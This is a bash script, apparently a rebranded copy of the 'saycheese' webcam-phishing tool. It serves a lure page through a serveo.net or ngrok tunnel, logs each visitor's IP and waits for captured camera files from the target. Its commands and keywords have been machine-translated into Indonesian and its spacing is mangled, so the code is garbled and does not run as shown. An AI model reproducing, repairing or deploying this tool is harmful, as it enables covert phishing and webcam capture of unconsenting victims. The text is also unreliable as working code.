trap  ' printf "\ n"; stop ' 2

spanduk () {

print'<================================================>'
print'<=              WELCOME TO MY TOOLS             =>'               
print'<= *Author : ./54M~4                            =>'               
print'<= *Email  : senjurama888@gmail.com             =>'                             
print'<= *kontak : 0813-9182-7202                     =>'                    
print'<=                  [GOOD LUCK]                 =>'
print'<================================================>'
print'<=                   <QUOTED>                   =>'
print'<=   [Aku terkadang iri dengan sebuah benda]    =>'
print'<=[Tidak memiliki rasa, namun selalu dibutuhkan]=>'
print'<=   [Berbeda dengan aku yang memiliki rasa]    =>'
print'<=      [namun ditinggalkan dan diabaikan]      =>'                            
print'<================================================>'
}
stop () {

checkngrok = $ ( ps aux | grep -o " ngrok "  | head -n1 )
checkphp = $ ( ps aux | grep -o " php "  | head -n1 )
checksh = $ ( ps aux | grep -o " ssh "  | head -n1 )
jika [[ $ checkngrok  ==  * ' ngrok ' * ]] ;  kemudian
pkill -f -2 ngrok > / dev / null 2> & 1
killall -2 ngrok > / dev / null 2> & 1
fi

jika [[ $ checkphp  ==  * ' php ' * ]] ;  kemudian
killall -2 php > / dev / null 2> & 1
fi
jika [[ $ checksh  ==  * ' ssh ' * ]] ;  kemudian
killall -2 ssh > / dev / null 2> & 1
fi
keluar 1

}

dependencies () {


perintah -v php > / dev / null 2> & 1  || { echo  > & 2  " Saya memerlukan php tetapi belum diinstal. Instal. Membatalkan. " ;  keluar 1 ; }
 


}

catch_ip () {

ip = $ ( grep -a ' IP: ' ip.txt | cut -d "  " -f2 | tr -d ' \ r ' )
IFS = $ ' \ n '
printf  " \ e [1; 93m [\ e [0m \ e [1; 77m + \ e [0m \ e [1; 93m] IP: \ e [0m \ e [1; 77m% s \ e [0m \ n] "  $ ip

kucing ip.txt >> disimpan.ip.txt


}

checkfound () {

printf  " \ n "
printf  " \ e [1; 92m [\ e [0m \ e [1; 77m * \ e [0m \ e [1; 92m] Menunggu target, \ e [0m \ e [1; 77m Tekan Ctrl + C untuk keluar ... \ e [0m \ n "
sementara [ benar ] ;  melakukan


jika [[ -e  " ip.txt " ]] ;  kemudian
printf  " \ n \ e [1; 92m [\ e [0m + \ e [1; 92m] Target membuka tautan! \ n "
catch_ip
rm -rf ip.txt

fi

tidur 0,5

jika [[ -e  " Log.log " ]] ;  kemudian
printf  " \ n \ e [1; 92m [\ e [0m + \ e [1; 92m] File kamera diterima! \ e [0m \ n "
rm -rf Log.log
fi
tidur 0,5

selesai 

}


server () {

perintah -v ssh > / dev / null 2> & 1  || { echo  > & 2  " Saya memerlukan ssh tetapi belum terpasang. Instal. Membatalkan. " ;  keluar 1 ; }

printf  " \ e [1; 77m [\ e [0m \ e [1; 93m + \ e [0m \ e [1; 77m] Memulai Serveo ... \ e [0m \ n "

jika [[ $ checkphp  ==  * ' php ' * ]] ;  kemudian
killall -2 php > / dev / null 2> & 1
fi

jika [[ $ subdomain_resp  ==  true ]] ;  kemudian

$ ( yang sh ) -c ' ssh -o StrictHostKeyChecking = tidak -o ServerAliveInterval = 60 -R ' $ subdomain ' : 80: localhost: 3333 serveo.net 2> / dev / null> sendlink '  &

tidur 8
lain
$ ( yang sh ) -c ' ssh -o StrictHostKeyChecking = tidak -o ServerAliveInterval = 60 -R 80: localhost: 3333 serveo.net 2> / dev / null> sendlink '  &

tidur 8
fi
printf  " \ e [1; 77m [\ e [0m \ e [1; 33m + \ e [0m \ e [1; 77m] Memulai server php ... (localhost: 3333) \ e [0m \ n "
fuser -k 3333 / tcp > / dev / null 2> & 1
php -S localhost: 3333 > / dev / null 2> & 1  &
tidur 3
send_link = $ ( grep -o " https: // [0-9a-z] * \. serveo.net " sendlink )
printf  ' \ e [1; 93m [\ e [0m \ e [1; 77m + \ e [0m \ e [1; 93m] Tautan langsung: \ e [0m \ e [1; 77m% s \ n '  $ send_link

}


payload_ngrok () {

tautan = $ ( curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o " https: // [0-9a-z] * \. ngrok.io " )
sed ' s + forwarding_link + ' $ link ' + g ' saycheese.html > index2.html
sed ' s + forwarding_link + ' $ link ' + g ' template.php > index.php


}

ngrok_server () {


jika [[ -e ngrok]] ;  kemudian
echo  " "
lain
perintah -v unzip > / dev / null 2> & 1  || { echo  > & 2  " Saya memerlukan unzip tetapi belum diinstal. Instal. Membatalkan. " ;  keluar 1 ; }
perintah -v wget > / dev / null 2> & 1  || { echo  > & 2  " Saya memerlukan wget tetapi belum diinstal. Instal. Membatalkan. " ;  keluar 1 ; }
printf  " \ e [1; 92m [\ e [0m + \ e [1; 92m] Mengunduh Ngrok ... \ n "
arch = $ ( uname -a | grep -o ' arm '  | head -n1 )
arch2 = $ ( uname -a | grep -o ' Android '  | head -n1 )
jika [[ $ arch  ==  * ' lengan ' * ]] || [[ $ arch2  ==  * ' Android ' * ]] ;  kemudian
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > / dev / null 2> & 1

jika [[ -e ngrok-stable-linux-arm.zip]] ;  kemudian
unzip ngrok-stable-linux-arm.zip > / dev / null 2> & 1
chmod + x ngrok
rm -rf ngrok-stable-linux-arm.zip
lain
printf  " \ e [1; 93m [!] Kesalahan unduhan ... Termux, jalankan: \ e [0m \ e [1; 77m pkg install wget \ e [0m \ n "
keluar 1
fi

lain
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > / dev / null 2> & 1 
jika [[ -e ngrok-stable-linux-386.zip]] ;  kemudian
unzip ngrok-stable-linux-386.zip > / dev / null 2> & 1
chmod + x ngrok
rm -rf ngrok-stable-linux-386.zip
lain
printf  " \ e [1; 93m [!] Kesalahan unduhan ... \ e [0m \ n "
keluar 1
fi
fi
fi

printf  " \ e [1; 92m [\ e [0m + \ e [1; 92m] Memulai server php ... \ n "
php -S 127.0.0.1:3333 > / dev / null 2> & 1  & 
tidur 2
printf  " \ e [1; 92m [\ e [0m + \ e [1; 92m] Memulai server ngrok ... \ n "
./ngrok http 3333 > / dev / null 2> & 1  &
tidur 10

tautan = $ ( curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o " https: // [0-9a-z] * \. ngrok.io " )
printf  " \ e [1; 92m [\ e [0m * \ e [1; 92m] Tautan langsung: \ e [0m \ e [1; 77m% s \ e [0m \ n "  $ link

payload_ngrok
checkfound
}

awal1 () {
jika [[ -e sendlink]] ;  kemudian
rm -rf sendlink
fi

printf  " \ n "
printf  " \ e [1; 92m [\ e [0m \ e [1; 77m01 \ e [0m \ e [1; 92m] \ e [0m \ e [1; 93m Serveo.net \ e [0m \ n "
printf  " \ e [1; 92m [\ e [0m \ e [1; 77m02 \ e [0m \ e [1; 92m] \ e [0m \ e [1; 93m Ngrok \ e [0m \ n "
default_option_server = " 1 "
read -p $ ' \ n \ e [1; 92m [ \ e [0m \ e [1; 77m + \ e [0m \ e [1; 92m] Pilih opsi Port Forwarding: \ e [0m ' option_server
option_server = " $ {option_server : - $ {default_option_server} } "
jika [[ $ option_server  -eq 1]] ;  kemudian

perintah -v php > / dev / null 2> & 1  || { echo  > & 2  " Saya memerlukan ssh tetapi belum terpasang. Instal. Membatalkan. " ;  keluar 1 ; }
Mulailah

elif [[ $ option_server  -eq 2]] ;  kemudian
ngrok_server
lain
printf  " \ e [1; 93m [!] Opsi tidak valid! \ e [0m \ n "
tidur 1
bersih
mulai1
fi

}


payload () {

send_link = $ ( grep -o " https: // [0-9a-z] * \. serveo.net " sendlink )

sed ' s + forwarding_link + ' $ send_link ' + g ' saycheese.html > index2.html
sed ' s + forwarding_link + ' $ send_link ' + g ' template.php > index.php


}

mulai () {

default_choose_sub = " Y "
default_subdomain = " saycheese $ ACAK "

printf  ' \ e [1; 33m [\ e [0m \ e [1; 77m + \ e [0m \ e [1; 33m] Pilih subdomain? (Default: \ e [0m \ e [1; 77m [Y / n] \ e [0m \ e [1; 33m): \ e [0m '
baca pilih_sub
select_sub = " $ {choose_sub : - $ {default_choose_sub} } "
jika [[ $ choose_sub  ==  " Y "  ||  $ choose_sub  ==  " y "  ||  $ choose_sub  ==  " Ya "  ||  $ pilih_sub  ==  " ya " ]] ;  kemudian
subdomain_resp = true
printf  ' \ e [1; 33m [\ e [0m \ e [1; 77m + \ e [0m \ e [1; 33m] Subdomain: (Default: \ e [0m \ e [1; 77m% s \ e [ 0m \ e [1; 33m): \ e [0m '  $ default_subdomain
baca subdomain
subdomain = " $ {subdomain : - $ {default_subdomain} } "
fi

server
muatan
checkfound

}

spanduk
ketergantungan
mulai1
          
        
